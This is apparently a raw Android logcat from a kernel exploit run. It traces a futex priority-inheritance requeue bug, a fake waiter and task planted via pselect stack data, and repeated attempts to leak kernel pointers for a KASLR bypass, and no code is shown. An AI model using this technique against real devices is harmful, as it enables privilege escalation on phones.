+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset DIFF out[1] pre=ffffff8b025f46d1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset DIFF out[4] pre=ffffff8b025f2380 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset DIFF ex[0] pre=ffffff8b025f04d0 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset DIFF ex[1] pre=0000008200000003 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset DIFF ex[4] pre=8000000000000000 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.480 13083 13084 I dchamp  : [*] slide fdset diff total=6 fdset_stext=0000000000000000
+08-22 05:20:57.481 13083 13084 I dchamp  : [*] slide waiter pselect_stack_copy done
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect RETURNED ret=0 errno=0 shift=3 probe=0 sched_ok=1 calls=1
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide pselect comparing fd_sets vs planted payload (diffs = kernel wrote back into the waiter stack region)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF in[3] pre=ffffff8b025f35c1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF out[1] pre=ffffff8b025f46d1 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF out[4] pre=ffffff8b025f2380 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF ex[0] pre=ffffff8b025f04d0 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF ex[1] pre=0000008200000003 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset DIFF ex[4] pre=8000000000000000 post=0000000000000000 (内核在鬼标签区写回的内容)
+08-22 05:20:57.481 26817 28034 I DchampApp: child| [33m[*] [0mslide fdset diff total=6 fdset_stext=0000000000000000
+08-22 05:20:57.482 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter pselect_stack_copy done
+08-22 05:20:57.518 13083 13083 I dchamp  : [*] slide child route_done, reading boot_id
+08-22 05:20:57.519 26817 28034 I DchampApp: child| [33m[*] [0mslide child route_done, reading boot_id
+08-22 05:20:57.519 13083 13083 W dchamp  : [-] slide leaked value is not a kernel pointer (likely untouched boot_id): 024bfbe4d20546a0
+08-22 05:20:57.519 13083 13083 I dchamp  : [*] slide child parked pid=13083 (exit_group PI cleanup avoided)
+08-22 05:20:57.519 26817 28034 I DchampApp: child| [31m[-] [0mslide leaked value is not a kernel pointer (likely untouched boot_id): 024bfbe4d20546a0
+08-22 05:20:57.520 26817 28034 I DchampApp: child| [33m[*] [0mslide child parked pid=13083 (exit_group PI cleanup avoided)
+08-22 05:20:57.520 28032 28032 W dchamp  : [-] slide attempt 2 failed n=8 stext=0000000000000000 shift=3
+08-22 05:20:57.520 26817 28034 I DchampApp: child| [31m[-] [0mslide attempt 2 failed n=8 stext=0000000000000000 shift=3
+08-22 05:21:17.270 28032 28032 I dchamp  : [*] slide attempt 3 uses pselect shift=3 page=ffffff8983850000 lock=ffffff89838504d0 w0=ffffff89838513a0 task=ffffff8983852380
+08-22 05:21:17.270 26817 28034 I DchampApp: child| [33m[*] [0mslide attempt 3 uses pselect shift=3 page=ffffff8983850000 lock=ffffff89838504d0 w0=ffffff89838513a0 task=ffffff8983852380
+08-22 05:21:17.274 21853 21853 I dchamp  : [+] slide child context route=pselect pid=21853 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:21:17.274 26817 28034 I DchampApp: child| [32m[+] [0mslide child context route=pselect pid=21853 uid=10448 euid=10448 gid=10448 egid=10448 attr=u:r:untrusted_app_27:s0:c192,c257,c512,c768 enforce=unreadable
+08-22 05:21:17.274 21853 21853 I dchamp  : [*] slide child creating threads waiter/owner
+08-22 05:21:17.275 26817 28034 I DchampApp: child| [33m[*] [0mslide child creating threads waiter/owner
+08-22 05:21:17.275 21853 21853 I dchamp  : [*] slide child waiting for waiter_waiting && owner_started
+08-22 05:21:17.275 21853 21856 I dchamp  : [*] slide owner started, locking pi_target futex=0x76d11bbfb8
+08-22 05:21:17.275 21853 21856 I dchamp  : [*] slide owner locked pi_target
+08-22 05:21:17.275 21853 21855 I dchamp  : [*] slide waiter tid=21855 locking pi_chain futex=0x76d11bbfa4
+08-22 05:21:17.275 21853 21855 I dchamp  : [*] slide waiter locked pi_chain
+08-22 05:21:17.276 26817 28034 I DchampApp: child| [33m[*] [0mslide child waiting for waiter_waiting && owner_started
+08-22 05:21:17.276 26817 28034 I DchampApp: child| [33m[*] [0mslide owner started, locking pi_target futex=0x76d11bbfb8
+08-22 05:21:17.276 26817 28034 I DchampApp: child| [33m[*] [0mslide owner locked pi_target
+08-22 05:21:17.276 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter tid=21855 locking pi_chain futex=0x76d11bbfa4
+08-22 05:21:17.276 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter locked pi_chain
+08-22 05:21:17.277 21853 21853 I dchamp  : [*] slide child owner_blocked_on_futex=1 tid=21856
+08-22 05:21:17.277 21853 21853 I dchamp  : [*] slide child conditions met, issuing FUTEX_CMP_REQUEUE_PI
+08-22 05:21:17.278 21853 21853 I dchamp  : [*] slide child FUTEX_CMP_REQUEUE_PI ret=-1 errno=35 (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)
+08-22 05:21:17.278 26817 28034 I DchampApp: child| [33m[*] [0mslide child owner_blocked_on_futex=1 tid=21856
+08-22 05:21:17.278 26817 28034 I DchampApp: child| [33m[*] [0mslide child conditions met, issuing FUTEX_CMP_REQUEUE_PI
+08-22 05:21:17.278 26817 28034 I DchampApp: child| [33m[*] [0mslide child FUTEX_CMP_REQUEUE_PI ret=-1 errno=35 (need ret=-1 errno=35: the buggy remove_waiter rollback only runs on EDEADLK)
+08-22 05:21:17.328 21853 21853 I dchamp  : [*] slide child sent SIGALRM, waiting route_done
+08-22 05:21:17.328 26817 28034 I DchampApp: child| [33m[*] [0mslide child sent SIGALRM, waiting route_done
+08-22 05:21:17.328 26817 28034 I DchampApp: child| [*] slide SIGALRM handler entered (interrupting pselect)
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide waiter after FUTEX_WAIT_REQUEUE_PI ret=-1 errno=110
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide waiter holding pi_chain across pselect
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide waiter before pselect_stack_copy page=ffffff8983850000 lock=ffffff89838504d0 w0=ffffff89838513a0 task=ffffff8983852380
+08-22 05:21:27.278 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter after FUTEX_WAIT_REQUEUE_PI ret=-1 errno=110
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map tree_pc w0 -> in[3] (global 3) = ffffff89838535c1
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map tree_right w1 -> in[4] (global 4) = 0000000000000000
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map tree_left w2 -> out[0] (global 5) = 0000000000000000
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map pi_parent w3 -> out[1] (global 6) = ffffff89838546d1
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map pi_right w4 -> out[2] (global 7) = 0000000000000000
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map pi_left w5 -> out[3] (global 8) = 0000000000000000
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map task w6 -> out[4] (global 9) = ffffff8983852380
+08-22 05:21:27.278 21853 21855 I dchamp  : [*] slide word map lock w7 -> ex[0] (global 10) = ffffff89838504d0
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide word map wake_state_prio w8 -> ex[1] (global 11) = 0000008200000003
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide word map deadline w9 -> ex[2] (global 12) = 0000000000000000
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide word map ww_ctx w10 -> ex[3] (global 13) = 0000000000000000
+08-22 05:21:27.279 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter holding pi_chain across pselect
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide dump pre-pselect in[3] (global 3) = ffffff89838535c1
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide dump pre-pselect out[1] (global 6) = ffffff89838546d1
+08-22 05:21:27.279 26817 28034 I DchampApp: child| [33m[*] [0mslide waiter before pselect_stack_copy page=ffffff8983850000 lock=ffffff89838504d0 w0=ffffff89838513a0 task=ffffff8983852380
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide dump pre-pselect out[4] (global 9) = ffffff8983852380
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide dump pre-pselect ex[0] (global 10) = ffffff89838504d0
+08-22 05:21:27.279 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_pc w0 -> in[3] (global 3) = ffffff89838535c1
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide dump pre-pselect ex[1] (global 11) = 0000008200000003
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide dump pre-pselect ex[4] (global 14) = 8000000000000000
+08-22 05:21:27.279 26817 28034 I DchampApp: child| [33m[*] [0mslide word map tree_right w1 -> in[4] (global 4) = 0000000000000000
+08-22 05:21:27.279 21853 21855 I dchamp  : [*] slide pselect setup shift=3 nfds=320 page=ffffff8983850000 fake_lock=ffffff89838504d0 fake_w0=ffffff89838513a0 fake_task=ffffff8983852380
